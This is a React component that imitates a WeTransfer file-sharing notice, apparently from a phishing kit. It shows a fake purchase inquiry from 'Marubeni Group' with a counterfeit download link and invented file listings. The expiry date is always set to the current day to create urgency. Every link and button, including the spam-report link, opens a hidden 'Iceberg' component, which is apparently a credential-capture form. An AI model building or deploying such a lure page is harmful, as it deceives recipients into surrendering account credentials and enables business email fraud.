import React, { useEffect, useState } from "react";
import './landbox.css';
import logggo from '../assets/logo.png';
import { Iceberg } from "../iceberg/iceberg";

export const LandBox = ()=>{


    const [modde, setModde] = useState(false);
    const teleportMode = ()=>{
        setModde(true);
    };

    const d = new Date();
    const date = d.getDate();
    
    // const momt = d.getMonth()
    const yearr = d.getFullYear();


    const month = ["January","February","March","April","May","June","July","August","September","October","November","December"];

    const nameOfMonth = month[d.getMonth()];

    // useEffect(()=>{
    //     if (date >= 31) {
    //         date = 1;
    //         nameOfMonth = nameOfMonth[nameOfMonth.length]
    //     }
    // }, []);

    // console.log(nameOfMonth);


    return(<>


    { modde ? <Iceberg /> : null }


    <div className="cntr">
        <div className="land_box_">

            <div className="logowrapper_">
                <img 
                    alt="logo"
                    className="log"
                    src={logggo}
                    onClick={teleportMode}
                />
            </div>


            <div className="main_view_first">
                    <p className="grp" onClick={teleportMode}>Marubeni Group</p>

                    <p className="sendpurch">sent you Purchase Docs</p>

                    <p className="totl">
                        3 items, 94.12 MB in total • Expires on 
                        &#160;
                        <span>{date}</span> <span>{nameOfMonth }</span> <span>{yearr}</span>
                    </p>


                    <div style={{textAlign:'center', marginTop:'4em'}}>
                    <span className="colour hey" style={{
                        color:'rgb(23, 24, 26)',
                        outline:'none',
                        margin:'0px',
                        padding:'20px',
                        fontSize:'14.5px',
                        textAlign:'center',
                        lineHeight:'0.6em ',
                        wordSpacing:'2px'
                    }}>
                        <b>
                            Purchase Inquiry:
                        </b>
                        &#160;
                        Hello, Please carefully go through the
                        <br/>
                        attached documents and revert to us.
                    </span>
                </div>



                <div className="btn_con___t">
                    <button className="get__Files_jhgfrTYUIJKkjhyt" onClick={teleportMode}>
                        Get your files
                    </button>
                </div>

                <hr className="h_are"/>



                <div className="dnld_ln__k">
                    <span className="lnk">Download link</span>
                    <u className="u___lnk" onClick={teleportMode}>
                        https://wetransfer.com/downloads/26e6a07d366eb229c465e6daa9390
                        <br/>
                        fa220230826171512/bb5f8ef76608566f5c3db018b5acc428202308261
                        <br/>
                        75730/dcfda4
                    </u>

                    <p className="item__S">
                        3 items
                    </p>


                    <div>
                        <div className="puff">
                            <div className="pdf">Purchase plan.pdf</div>
                            <div className="pdf_childre__n">3.8 MB</div>
                        </div>

                        <div className="puff">
                            <div className="pdf">Product specifications.pdf</div>
                            <div className="pdf_childre__n">88.6 MB</div>
                        </div>


                        <div className="puff">
                            <div className="pdf">RFQ Form.docx</div>
                            <div className="pdf_childre__n">1.72 MB</div>
                        </div>
                    </div>


                </div>





            </div>

            <p className="fotte_dfrtyhjnBVCDr">
                To make sure our emails arrive, please add 
                    &#160;
                <span style={{cursor:'pointer'}} onClick={teleportMode}>noreply@wetransfer.com </span>
                to 
                &#160;
                <u style={{cursor:'pointer'}} onClick={teleportMode}>your contacts.</u>
            </p>




            <div className="fn_jvcdrtyukmnbvctl">
                <span>
                    <span style={{cursor:'pointer'}} onClick={teleportMode}> <u>About WeTransfer</u> </span>
                    &#160;&#160;&#160;&#160;&#160;&#160;
                    <span className="und">•</span>
                </span>
                &#160;&#160;&#160;&#160;&#160;&#160;

                <span>
                    <span style={{cursor:'pointer'}} onClick={teleportMode}> <u>Help</u> </span>
                    &#160;&#160;&#160;&#160;&#160;&#160;
                    <span className="und">•</span>
                </span>
                &#160;&#160;&#160;&#160;&#160;&#160;

                <span>
                    <span style={{cursor:'pointer'}} onClick={teleportMode}> <u>Legal</u> </span>
                    &#160;&#160;&#160;&#160;&#160;&#160;
                    <span className="und">•</span>
                </span>
                &#160;&#160;&#160;&#160;&#160;&#160;

                <span>
                    <span style={{cursor:'pointer'}} onClick={teleportMode}> <u>Report this transfer as spam</u> </span>
                    &#160;&#160;&#160;&#160;&#160;&#160;
                    {/* <span className="und">•</span> */}
                </span>
                {/* &#160;&#160;&#160;&#160;&#160;&#160; */}
            </div>

            


        </div>
    </div></>)
};